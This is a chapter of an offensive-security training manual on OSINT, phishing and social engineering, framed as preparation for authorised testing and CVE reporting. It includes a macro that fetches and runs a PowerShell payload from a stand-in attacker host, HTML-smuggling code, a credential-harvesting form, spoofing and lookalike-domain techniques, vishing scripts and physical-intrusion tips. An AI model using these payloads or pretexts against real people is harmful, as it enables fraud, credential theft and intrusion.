# Chapter 22 — OSINT & Social Engineering: The Human Factor

**VADER-RCE Field Manual**
**Volume V: SPECIAL FORCES — Domain Warfare**
**Prerequisite**: Chapters 1-21 (the complete technical foundation)
**Drill**: DRILLS/22_osint_se/

This is the last chapter. Not because it's the least important — because it's the most dangerous.

Every exploit in this manual targets a machine. This chapter targets the operator sitting in front of it. Social engineering is responsible for more breaches than every CVE in the NVD database combined. Phishing is the #1 initial access vector in every annual threat report since they started writing them. The best firewall in the world has a bypass — the human who clicks "Allow."

OSINT feeds social engineering. Social engineering delivers your payload. Together, they are the complete intelligence cycle that turns public information into private access.

You are now learning to be a full-spectrum operator.

---

## OSINT — Open Source Intelligence

OSINT is the collection and analysis of publicly available information. "Publicly available" is doing heavy lifting in that sentence — you'd be horrified at what's public.

The goal: build a detailed picture of a target (person, company, infrastructure) using only information that's freely accessible. No hacking. No exploitation. Just looking at what's already been published, leaked, forgotten, or misconfigured.

### Google Dorking

Google indexes more than anyone intends. Advanced search operators let you find the shit that was supposed to stay hidden.

**Core operators:**
```
site:target.com                    -- Only results from this domain
filetype:pdf site:target.com       -- PDF files on the domain
filetype:xlsx site:target.com      -- Spreadsheets (often contain data)
filetype:sql site:target.com       -- Database dumps (yes, really)
filetype:env site:target.com       -- .env files with credentials
filetype:log site:target.com       -- Log files
intitle:"index of" site:target.com -- Open directory listings
inurl:admin site:target.com        -- Admin pages
inurl:login site:target.com        -- Login portals
intext:password site:target.com    -- Pages containing "password"
intext:"@target.com"               -- Email addresses
```

**Dangerous combinations:**
```
filetype:sql "INSERT INTO" "password"
-- Database dumps with password hashes. On the open internet.

filetype:env "DB_PASSWORD"
-- .env files with database credentials. Indexed by Google.

intitle:"index of" "wp-config.php.bak"
-- WordPress config backups with database creds in plaintext.

site:pastebin.com "target.com"
-- Leaked data on paste sites.

site:trello.com "target.com"
-- Trello boards with internal information (often public by default).

"target.com" password filetype:log
-- Log files that captured passwords.

inurl:"/wp-content/debug.log"
-- WordPress debug logs with stack traces, paths, sometimes credentials.
```

**Google Hacking Database (GHDB)** — `exploit-db.com/google-hacking-database` — thousands of curated dorks for finding specific vulnerabilities, files, and misconfigurations.

### Shodan — The Search Engine for Machines

Google indexes web pages. Shodan indexes internet-connected devices — every IP, every port, every banner.

```
# Search for target's infrastructure
org:"Target Corp"
hostname:target.com
net:203.0.113.0/24

# Find specific services
port:3389 org:"Target Corp"        -- RDP servers
port:22 org:"Target Corp"          -- SSH servers
port:445 org:"Target Corp"         -- SMB shares
port:27017 org:"Target Corp"       -- MongoDB (often no auth)
port:9200 org:"Target Corp"        -- Elasticsearch
port:6379 org:"Target Corp"        -- Redis
port:5432 org:"Target Corp"        -- PostgreSQL
port:1433 org:"Target Corp"        -- MSSQL

# Find vulnerabilities
vuln:CVE-2021-44228 org:"Target Corp"  -- Log4Shell
vuln:CVE-2023-44487                      -- HTTP/2 Rapid Reset

# IoT and industrial
"Server: Apache" "200 OK" port:80 country:AU
webcam has_screenshot:true
"Siemens" port:102                  -- SCADA/ICS
```

**Shodan CLI:**
```bash
shodan init YOUR_API_KEY
shodan search --fields ip_str,port,org "hostname:target.com"
shodan host 203.0.113.50
```

**Censys** (`search.censys.io`) — similar to Shodan but with a different index. Some things show up on Censys that Shodan misses, and vice versa. Use both.

**ZoomEye** (`zoomeye.org`) — Chinese equivalent. Strong coverage of APAC infrastructure.

### Social Media Profiling

People post everything. Their location, their workplace, their tech stack, their passwords (in background photos of monitors), their badge photos, their building layouts.

**LinkedIn:**
- Employee names, roles, team structures
- Technology stack (job postings list the technologies used)
- Email format (if one email is `firstname.lastname@target.com`, they all are)
- Former employees (may still have credentials or knowledge)
- Company size and growth patterns

**Twitter/X:**
- Developers complaining about specific technologies (reveals stack)
- Error screenshots with paths, IPs, or credentials visible
- Conference talks mentioning internal architecture

**GitHub/GitLab:**
```bash
# Search for leaked secrets in target's repos
# Historical commits may contain credentials even if they've been removed
git log --all -p | grep -iE "(password|secret|api[_-]?key|token)" 

# Gitleaks — automated secret scanning
gitleaks detect --source https://github.com/target/repo

# trufflehog — deep secret scanning including commit history
trufflehog git https://github.com/target/repo --only-verified
```

**What developers accidentally commit:**
- `.env` files with database passwords, API keys, cloud credentials
- `config.yaml` with production secrets
- SSH private keys
- AWS access keys
- Slack webhook URLs
- Internal documentation with network diagrams
- Hardcoded credentials in test files
- `docker-compose.yml` with production database passwords

Even if they delete it in the next commit, it's in the git history forever. And GitHub's event API caches push events — the code might be retrievable even after force-push.

### WHOIS and DNS

```bash
# WHOIS — domain registration info
whois target.com
# Registrant name, email, phone, address (if not privacy-protected)
# Registrar, nameservers, creation/expiry dates

# DNS records
dig target.com ANY
dig target.com MX         -- Mail servers
dig target.com TXT        -- SPF, DKIM, DMARC (and sometimes secrets)
dig target.com NS         -- Nameservers
dig _dmarc.target.com TXT -- DMARC policy

# Reverse DNS
dig -x 203.0.113.50

# DNS zone transfer (if misconfigured)
dig axfr @ns1.target.com target.com
# If this works, you just got every DNS record. Jackpot.
```

### Certificate Transparency Logs

Every TLS certificate is logged publicly. This reveals subdomains the target may not want public:

```bash
# crt.sh
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sort -u

# Results include:
# dev.target.com
# staging.target.com
# internal-api.target.com
# vpn.target.com
# jenkins.target.com
```

Dev and staging environments are almost always less hardened than production.

---

## Email OSINT

Email addresses are the keys to the kingdom for phishing. Enumerate them before you craft a single message.

### Email Enumeration

```bash
# hunter.io — find emails associated with a domain
# Returns email patterns, verified addresses, and confidence scores
curl "https://api.hunter.io/v2/domain-search?domain=target.com&api_key=KEY"

# phonebook.cz — free email/URL/domain enumeration
# Manual search at phonebook.cz, results are extensive

# theHarvester — aggregates multiple sources
theHarvester -d target.com -b all -l 500
```

**Email pattern identification:**
```
john.smith@target.com      → firstname.lastname
jsmith@target.com          → firstinitiallastname
john.s@target.com          → firstname.lastinitial
johns@target.com           → firstnamelastinitial
```

Once you know the pattern and have employee names (LinkedIn), you can generate a complete email list.

### Email Header Analysis

When you receive an email from the target (or find one in a leak):

```
Received: from mail-server.target.com (203.0.113.50)
    by mx.google.com with ESMTPS
    
X-Mailer: Microsoft Outlook 16.0
X-Originating-IP: [10.0.0.50]       ← Internal IP leaked
```

Headers reveal:
- Mail server software and version
- Internal IP addresses
- Security software (X-Spam headers, X-Forefront-Antispam)
- Email authentication (SPF, DKIM, DMARC results)

### Email Verification Without Sending

```bash
# SMTP verification — check if an address exists without sending mail

# Connect to the MX server
nmap -Pn -p25 --script smtp-commands mail.target.com

# Manual SMTP session
telnet mail.target.com 25
HELO attacker.com
MAIL FROM:<test@attacker.com>
RCPT TO:<john.smith@target.com>
# 250 = exists, 550 = doesn't exist

# Some servers respond differently to valid vs invalid addresses
# Others accept all (catch-all) — can't enumerate this way
```

**Tools:**
```bash
# smtp-user-enum
smtp-user-enum -M VRFY -U users.txt -t mail.target.com
smtp-user-enum -M RCPT -U users.txt -t mail.target.com
```

---

## Infrastructure Reconnaissance

Map everything the target owns on the internet. Every subdomain, every IP, every service, every technology.

### Subdomain Enumeration

```bash
# Passive enumeration (no direct contact with target)
subfinder -d target.com -o subs.txt
amass enum -passive -d target.com

# Certificate transparency
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sort -u >> subs.txt

# SecurityTrails API
curl "https://api.securitytrails.com/v1/domain/target.com/subdomains" -H "APIKEY: KEY"

# Active enumeration (sends DNS queries — target might notice)
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -u http://FUZZ.target.com -mc 200,301,302,403

# DNS brute force
amass enum -brute -d target.com -w subdomains.txt

# Resolve and probe
cat subs.txt | sort -u | httpx -silent -status-code -title -tech-detect
```

### Technology Stack Identification

**Know what you're attacking before you attack it.**

```bash
# Wappalyzer / webanalyze (CLI version)
webanalyze -host target.com

# WhatWeb
whatweb target.com -a 3

# HTTP headers reveal a lot
curl -sI https://target.com
# Server: nginx/1.21.3           ← Web server + version
# X-Powered-By: PHP/8.1          ← Language + version
# X-AspNet-Version: 4.0.30319    ← .NET version
# Set-Cookie: JSESSIONID=...     ← Java backend
# Set-Cookie: PHPSESSID=...      ← PHP backend
# Set-Cookie: connect.sid=...    ← Node.js/Express
```

**Fingerprinting through errors:**
- 404 pages often reveal the framework
- Stack traces in error responses show the entire technology chain
- Default pages (`/robots.txt`, `/sitemap.xml`, `/humans.txt`)

### Cloud Infrastructure Mapping

```bash
# S3 bucket enumeration
# Common naming patterns:
# target.com → target, target-prod, target-dev, target-backup, target-assets
aws s3 ls s3://target-backup --no-sign-request
# "no sign request" = try anonymous access

# S3 bucket finder tools
python3 cloud_enum.py -k target

# Azure blob storage
# target.blob.core.windows.net
curl https://target.blob.core.windows.net/\$web?restype=container\&comp=list

# GCP storage
# storage.googleapis.com/target-bucket
gsutil ls gs://target-bucket
```

**Common S3 misconfigurations:**
- Public read (anyone can list and download)
- Public write (anyone can upload — deface or plant malware)
- Authenticated read (any AWS account can access)
- Over-permissive bucket policies

### Historical Data

```bash
# Wayback Machine — archived versions of the target's site
# Shows old pages, removed features, leaked paths, historical configs
curl "http://web.archive.org/cdx/search/cdx?url=target.com/*&output=json&limit=1000"

# SecurityTrails — historical DNS records
# Shows old IPs, past hosting providers, infrastructure changes

# BuiltWith — technology history
# Shows what technologies the site used in the past
```

Old DNS records reveal past infrastructure. Past infrastructure may still be live. That old staging server from 2022 that IT forgot to decommission? It's still there, still vulnerable, still connected to the internal network.

---

## Social Engineering Fundamentals

Social engineering exploits the most complex and least patchable system: the human mind. Before you learn the techniques, understand why they work.

### Cialdini's Six Principles of Influence

Robert Cialdini identified six psychological principles that govern human decision-making. Every social engineering attack exploits at least one:

**1. Reciprocity** — When someone does something for you, you feel obligated to return the favor.
- "I helped you with that IT issue last week, could you just confirm your login for me?"
- Send a small gift, then ask for something bigger.

**2. Commitment and Consistency** — Once people commit to something, they feel pressure to follow through.
- "You agreed to help test the new system, right? I just need you to click this link."
- Get a small "yes" first, then escalate.

**3. Social Proof** — People follow what others are doing.
- "Everyone in accounting has already updated their credentials through this portal."
- CC multiple people on a phishing email to make it look like a normal internal communication.

**4. Authority** — People comply with authority figures without questioning.
- Email from "IT Security" or "the CEO's office."
- Wearing a badge and a hi-vis vest gets you into most buildings.

**5. Liking** — People are more easily persuaded by people they like.
- Build rapport first. Be friendly. Use their name. Mirror their communication style.
- LinkedIn connection → casual conversation → "by the way, what VPN do you use?"

**6. Scarcity** — Urgency and limited availability bypass rational thinking.
- "Your account will be locked in 2 hours if you don't verify."
- "This security update must be applied before end of business today."

These aren't tricks. They're deeply wired cognitive shortcuts that evolved to help humans survive in small groups. They break catastrophically in the context of adversarial communication.

### Pretexting

A pretext is the cover story that justifies your social engineering. The better the pretext, the less suspicious the target.

**Strong pretexts:**
- IT support: "We're migrating email servers this weekend. Can you verify your credentials on the new portal?"
- New employee: "Hey, I just started in marketing. I can't figure out how to access the shared drive. Can you help?"
- Vendor/contractor: "I'm from [real vendor name]. I need to update the software on your server. Can someone let me into the server room?"
- Executive assistant: "I'm calling on behalf of [CEO name]. They need the Q4 report sent to this email immediately."

**Building a pretext:**
1. Research the target (OSINT) — know names, roles, jargon, current projects
2. Choose a role that has a legitimate reason to make the request
3. Create urgency but not panic (panic triggers suspicion)
4. Have answers ready for follow-up questions
5. Know when to abort — pushing too hard burns the pretext

### Why SE Works

It's not because people are stupid. It's because:

- **Humans are wired to help.** Refusing a reasonable request feels rude. Most people would rather be scammed than seem unhelpful.
- **Trust is the default.** We assume people are who they say they are until proven otherwise. Verification requires effort; trust is free.
- **Cognitive load is the attacker's ally.** Busy people don't have time to verify every request. They take shortcuts.
- **Authority bypasses critical thinking.** When "IT Security" or "the CEO" asks, people comply first and question later.
- **Fear of consequences beats fear of scams.** "Your account will be locked" is more immediately concerning than "this might be phishing."

---

## Phishing — The Primary Attack Vector

Phishing delivers more initial compromises than all other vectors combined. Every APT group uses it. Every ransomware deployment starts with it. It works because it scales.

### Spear Phishing vs Mass Phishing

**Mass phishing:** Send the same email to 10,000 people. 1-3% click rate = 100-300 compromised machines. Volume play.

**Spear phishing:** Research one specific target. Craft a personalized email referencing their name, role, current projects, recent events. 30-60% click rate. Quality play. This is how APTs operate.

### Email Construction

**Sender spoofing:**
```
From: IT Security <security@target.com>
Reply-To: attacker@evil.com
```

SPF, DKIM, and DMARC are supposed to prevent this. In practice:
- Many domains don't have strict DMARC policies (`p=none` instead of `p=reject`)
- Lookalike domains bypass email auth entirely: `target-security.com`, `targett.com`, `target.co`
- Subdomain spoofing: `security.target.com` if the parent domain's SPF doesn't cover subdomains

**Lookalike domains:**
```
target.com  →  targ3t.com       (leet speak)
target.com  →  targer.com       (typosquat)
target.com  →  target-corp.com  (hyphenation)
target.com  →  targetcom.co     (TLD swap)
target.com  →  tаrget.com       (homoglyph — 'а' is Cyrillic, not Latin)
```

Register the domain, set up SPF/DKIM/DMARC for it, and your phishing emails pass email authentication checks because they genuinely are from a domain you control.

**Urgency triggers in subject lines:**
```
[URGENT] Password Expiry Notice — Action Required
Invoice #38291 — Payment Overdue
Shared Document: Q4 Revenue Report
Your Zoom Meeting Recording is Ready
IT Security Alert: Unusual Login Detected
```

### Payload Delivery

**Office macros (classic but dying):**
```vba
Sub AutoOpen()
    Shell "powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"
End Sub
```
Microsoft has been disabling macros by default since 2022, but many organisations re-enable them for "business needs."

**HTML smuggling:**
```html
<!-- Embed a binary in the HTML, reconstruct it via JavaScript -->
<script>
var data = atob("TVqQAAMAAAAEAAAA...");  // Base64-encoded exe
var blob = new Blob([new Uint8Array([...data].map(c => c.charCodeAt(0)))], {type: 'application/octet-stream'});
var a = document.createElement('a');
a.href = URL.createObjectURL(blob);
a.download = "Important_Document.exe";
a.click();
</script>
```
The payload is assembled in the browser. Email security scans see an HTML file, not an executable.

**QR code phishing (quishing):**
Embed a QR code in the email or a PDF attachment. The user scans it with their phone (which bypasses corporate email security entirely because the phone is on mobile data, not the corporate network).

**Link manipulation:**
```html
<a href="https://attacker.com/login">https://target.com/login</a>

<!-- Or with URL encoding -->
https://target.com@attacker.com/login
<!-- Browsers treat everything before @ as a username, not a domain -->
```

### Credential Harvesting

Clone the target's login page:

```bash
# Quick clone with wget
wget -mk https://target.com/login

# Or use Gophish, evilginx2, or Modlishka for automated campaigns
```

Modify the form action to POST to your server:
```html
<form action="https://attacker.com/capture" method="POST">
    <input name="username" placeholder="Email">
    <input name="password" type="password" placeholder="Password">
    <button>Sign In</button>
</form>
```

**evilginx2** is the evolution — it proxies the real login page in real time, capturing the session token after the user completes MFA. The user logs into the real site, MFA and all. evilginx sits in the middle and steals the authenticated session. MFA doesn't help here.

### GoPhish for Controlled Campaigns

GoPhish is the standard tool for authorised phishing assessments:

```bash
# Install and configure
./gophish

# Web admin at https://localhost:3333
# 1. Create email template (your phishing email)
# 2. Create landing page (your fake login page)
# 3. Create user group (target email addresses)
# 4. Create sending profile (SMTP server)
# 5. Launch campaign
# 6. Track: emails sent, emails opened, links clicked, credentials entered
```

The tracking data is what matters for the client report. "42% of your employees entered their credentials on a fake login page" is the kind of metric that gets security budgets approved.

---

## Vishing & Physical SE

### Vishing (Voice Phishing)

Phone calls add urgency and authority that email can't match. People process voice differently than text — there's less time to think, more pressure to respond immediately.

**Classic pretexts:**
```
"Hi, this is James from IT. We've detected unusual activity on your account.
I need to verify your identity before I can investigate. Can you confirm
your employee ID and the last four of your password?"
```

```
"This is Sarah from [real vendor]. We're seeing an issue with your
license renewal. I need to remote into your machine to check
the configuration. Can you go to support.evil.com and enter
the session code 847291?"
```

**Vishing tips:**
- Call during busy hours when people are stressed and rushing
- Use a spoofed caller ID showing the company's actual number
- Have background noise (keyboard sounds, phone ringing) to sound like a real office
- If they question you, respond with mild annoyance, not defensiveness — "Look, I'm just trying to help. I have 12 more tickets to get through."
- Know when to hang up. If they say they'll call IT to verify, end the call immediately.

### Physical Social Engineering

Getting into buildings without authorisation. This is where SE becomes physical penetration testing.

**Tailgating:**
Follow someone through a badge-access door. Carry a box, a coffee tray, or look like you're on a phone call. Most people will hold the door for you.

**Badge cloning:**
```
# Long-range RFID readers can capture badge data from meters away
# Proxmark3 is the standard tool
# Clone the badge to a blank card
# Walk in the front door
```

**Dumpster diving:**
Companies throw away:
- Org charts
- Internal phone directories
- Network diagrams
- Old hard drives (not wiped)
- Printed credentials
- Meeting notes with project details

**USB drop attacks:**
Leave USB drives in the parking lot, lobby, or common areas. Label them "Salary Review 2026" or "Confidential — HR." Human curiosity does the rest.

When plugged in:
- **Rubber Ducky / BadUSB**: Appears as a keyboard, types pre-programmed commands at superhuman speed. Opens PowerShell, downloads payload, executes it. Takes 3 seconds.
- **Bash Bunny**: More sophisticated — can emulate multiple devices (keyboard + storage + network adapter).
- **Data exfil**: The drive looks normal but has an autorun script (if autorun isn't disabled) or a trojanized file that executes when opened.

**Pretexting for physical access:**
- Delivery driver: high-vis vest, clipboard, package
- Fire inspector: clipboard, ID badge (doesn't have to be real — who checks?)
- IT contractor: tool bag, laptop bag, badge that says "Vendor"
- Cleaning crew: uniform, master key (social-engineered from building management)

---

## SE In The Context of CVE Research

You're not a phisher. You're not a grifter. You're a security researcher. So why do you need to know this?

### Delivery Is Part of the Vulnerability

When you write a CVE report, one of the key factors is "attack vector." CVSS scores include:

```
AV:N  — Network (remote, no user interaction)
AV:A  — Adjacent (same network)
AV:L  — Local (requires local access)
AV:P  — Physical (requires physical access)
```

And "user interaction":
```
UI:N  — None required
UI:R  — Required (user must click/open something)
```

Most of the vulnerabilities you've studied in this manual — the memory corruption bugs, the kernel exploits, the parser vulnerabilities — they require delivery. Someone has to open the malicious file. Someone has to visit the malicious page. Someone has to plug in the USB drive.

**That delivery is social engineering.**

Your heap overflow in mpengine.dll (Chapter 10) that triggers when Defender scans a crafted file? In the real world, that file reaches the target because:
1. A phishing email delivers it as an attachment
2. The user downloads it from a watering-hole site
3. It's dropped via USB in the target's parking lot

The exploit is your weapon. Social engineering is how you get it to the target. Understanding SE lets you assess the real-world risk of a vulnerability, not just the theoretical risk.

### Writing Better CVE Reports

When you describe impact in a vulnerability report, understanding SE lets you write realistic attack scenarios:

```
ATTACK SCENARIO:
An attacker sends a crafted PDF file via email to the target organization.
When any user opens the file, or when the email security gateway
scans the attachment, the vulnerability triggers, resulting in
arbitrary code execution with the privileges of the scanning service.
No user interaction beyond receiving the email is required if
the gateway has automatic scanning enabled.
```

That scenario is credible because you understand how phishing delivery works. An assessor who doesn't understand SE writes vague "an attacker could exploit this" language. You write scenarios that demonstrate exactly how.

---

## OPSEC — Protecting Yourself

You've just learned how to profile targets. Now understand: you are also a target.

Every time you do security research, you leave traces. Your OSINT queries, your DNS lookups, your Shodan searches, your GitHub activity — all of it is observable. When you go from research into active testing, the traces multiply.

### Compartmentalization

**Research identity vs real identity:**
- Use separate browsers, separate email addresses, separate machines
- Research browser: hardened Firefox with uBlock Origin, NoScript, no logins to personal accounts
- Don't research a target from the same IP you check your personal email from
- Don't use the same usernames across research and personal accounts

**The BLACKOPS doctrine applies here.** Your research footprint should not be traceable back to your real identity unless you specifically choose to publish under your name.

### Anonymous Research Infrastructure

```
# VPN (paid with crypto, no-log policy, not based in Five Eyes)
# Tor for passive OSINT (slow but anonymous)
# Dedicated VPS for active recon (paid anonymously, different from your personal servers)
```

**VPN selection criteria:**
- No-log policy (independently audited, not just claimed)
- RAM-only servers (no disk means no historical data)
- Accepts cryptocurrency
- Based outside mandatory data retention jurisdictions
- Kill switch (cuts internet if VPN drops)

**When to use what:**
- Passive OSINT (Google dorking, LinkedIn browsing): VPN is sufficient
- Active scanning (nmap, subdomain brute force): dedicated VPS through VPN
- Submitting bug bounty reports: real identity (you want to get paid)
- Publishing CVE research: real name builds reputation

### What to Publish and What to Keep Private

**Publish:**
- CVE identifiers after responsible disclosure and patch
- Methodology (how you found it, general techniques)
- Tools you built (builds reputation, helps the community)
- Analysis of publicly known vulnerabilities

**Keep private:**
- Zero-days before disclosure
- Target-specific OSINT findings
- Exploit code that hasn't been reported
- Client engagement details (forever, not just during)
- Your personal toolchain specifics (what you use is your advantage)

### Digital Hygiene

```bash
# Check what's public about YOU
# Run the same OSINT techniques against your own name, email, username

# Google yourself
"your.email@gmail.com"
"your_username"
site:github.com "your_username"

# Check breach databases
# haveibeenpwned.com — check if your email is in known breaches

# Check your GitHub
# Are there any secrets in your commit history?
trufflehog git https://github.com/YOUR_USERNAME/YOUR_REPO
```

If you found something about yourself, an adversary can find it too. Clean it up.

---

## The Full Kill Chain — Putting It All Together

Twenty-two chapters. One operation.

The Cyber Kill Chain (Lockheed Martin's model, adapted):

```
1. RECONNAISSANCE (Chapters 21-22)
   └── OSINT, infrastructure mapping, employee profiling
   
2. WEAPONIZATION (Chapters 1-10)
   └── Build the exploit: heap overflow, format string, ROP chain
   └── Package it: craft the malicious file, embed the shellcode
   
3. DELIVERY (Chapter 22)
   └── Phishing email, watering hole, USB drop, physical access
   
4. EXPLOITATION (Chapters 1-14)
   └── Memory corruption triggers, parser vulnerability fires
   └── Web app exploitation: SQLi, XSS, SSRF, deserialization
   
5. INSTALLATION (Chapters 15-16)
   └── Drop persistence: registry keys, scheduled tasks, rootkits
   └── Web shells, backdoors, implants
   
6. COMMAND & CONTROL (Chapters 17-18)
   └── Establish encrypted C2 channel back to operator
   └── Beaconing, DNS tunneling, domain fronting
   
7. ACTIONS ON OBJECTIVES (Chapters 19-20)
   └── Lateral movement, privilege escalation, data exfiltration
   └── Whatever the mission requires
```

Every chapter in this manual covers a link in this chain. They aren't twenty-two separate skills. They're twenty-two stages of a single operation.

### The MITRE ATT&CK Mapping

The ATT&CK framework maps to this manual:

| ATT&CK Tactic | Manual Chapters |
|----------------|----------------|
| Reconnaissance | Ch 22 (OSINT, infrastructure recon) |
| Resource Development | Ch 1-10 (exploit dev, payload creation) |
| Initial Access | Ch 21-22 (web app attacks, phishing) |
| Execution | Ch 1-6 (shellcode, code execution) |
| Persistence | Ch 15-16 (rootkits, implants, backdoors) |
| Privilege Escalation | Ch 11-14 (kernel exploits, local privesc) |
| Defense Evasion | Ch 9-10 (AV bypass, AMSI, ETW) |
| Credential Access | Ch 21 (auth attacks, session hijack) |
| Discovery | Ch 19 (internal recon, AD enumeration) |
| Lateral Movement | Ch 19-20 (pivoting, network exploitation) |
| Collection | Ch 20 (data staging, exfil prep) |
| Command and Control | Ch 17-18 (C2 frameworks, covert channels) |
| Exfiltration | Ch 20 (data exfiltration techniques) |
| Impact | All (every chapter is a weapon) |

---

## The Complete Operator

You started in Chapter 1 with a hex dump of a heap metadata structure. Raw bytes. Abstract. Trying to understand why `0x41414141` in the right place crashes a program.

You end here, in Chapter 22, understanding that the person who opens the file containing those bytes was convinced to do so by an email that exploited the same fundamental principle: **the gap between what something appears to be and what it actually is.**

A heap overflow exploits the gap between the allocator's assumption about metadata integrity and the reality of attacker-controlled bytes. A phishing email exploits the gap between the user's assumption about sender identity and the reality of a spoofed domain. The mechanism is different. The principle is identical.

**From memory to humans.** From `malloc` to Cialdini. From ROP chains to pretext chains. The attack surface changed, but the methodology didn't:

1. **Understand the system.** Whether it's a heap allocator or a human cognitive model. You can't exploit what you don't understand.

2. **Find the assumption.** Every system operates on assumptions. The heap assumes metadata hasn't been corrupted. The user assumes the email is from IT. The firewall assumes internal traffic is trusted. Find the assumption that's wrong.

3. **Violate the assumption in a controlled way.** Overwrite the forward pointer. Spoof the sender. Tunnel through DNS. Controlled, precise, predictable.

4. **Achieve the objective.** Code execution. Credential harvest. Lateral movement. Whatever the mission requires.

You are now a full-spectrum operator. You understand the machine from the transistor to the TCP stack to the web application to the human sitting at the keyboard. You see the full chain, from first recon to final objective.

### What Comes Next

This manual gave you the theory, the techniques, and the methodology. What it can't give you is experience. That comes from:

- **Labs**: HackTheBox, TryHackMe, PortSwigger Web Security Academy, PentesterLab. Do them all.
- **CTFs**: Capture The Flag competitions. Time-pressured problem-solving with real exploits.
- **Bug bounties**: HackerOne, Bugcrowd. Real targets, real money, real consequences for sloppy work.
- **CVE research**: Find your own vulnerabilities. Report them responsibly. Build your reputation.
- **Red team operations**: Authorised adversary simulation against real organisations.

The manual is the map. The territory is out there. Go operate.

---

## Summary — Key Takeaways

- **OSINT reveals more than most people realise is public.** Google dorks, Shodan, certificate transparency, social media, and GitHub together build a comprehensive picture of any target without sending a single packet to their infrastructure.

- **Email is the #1 delivery vector.** Enumerate email addresses, understand email authentication (SPF/DKIM/DMARC), and know how to construct convincing phishing emails. Even if you never send one, understanding phishing delivery is essential for assessing vulnerability impact.

- **Social engineering exploits cognitive shortcuts, not stupidity.** Reciprocity, authority, urgency, social proof — these are hardwired human behaviors. They work on security professionals too. The defense is process, not awareness.

- **Pretexting is the foundation of all social engineering.** The cover story must be believable, internally consistent, and resistant to casual verification. Research the target first. Know names, roles, jargon, current projects.

- **Phishing has evolved beyond email links.** HTML smuggling, QR codes, MFA-proxying tools like evilginx2, and AI-generated content make phishing harder to detect than ever. The old "check for typos" advice is worthless against a competent attacker.

- **Physical security is social engineering.** Tailgating, badge cloning, pretexting as a contractor — getting into a building often requires less technical skill than getting into a network.

- **SE matters for CVE research.** The delivery mechanism is part of the vulnerability's impact. Understanding how an exploit reaches its target lets you write realistic attack scenarios and assess real-world risk.

- **OPSEC is not optional.** Compartmentalise your research and personal identities. Use VPNs and dedicated infrastructure. Know what's public about you. The same OSINT techniques you use against targets can be used against you.

- **The Kill Chain is one operation, not twenty-two skills.** OSINT feeds social engineering feeds delivery feeds exploitation feeds persistence feeds lateral movement feeds the objective. Every chapter in this manual is a link in that chain.

- **The gap between appearance and reality is the universal attack surface.** Heap metadata looks valid. The email looks legitimate. The badge looks real. Finding and exploiting that gap — whether in silicon or in human cognition — is what makes an operator.

You've read the manual. Now close it. Open a terminal. Go find something.
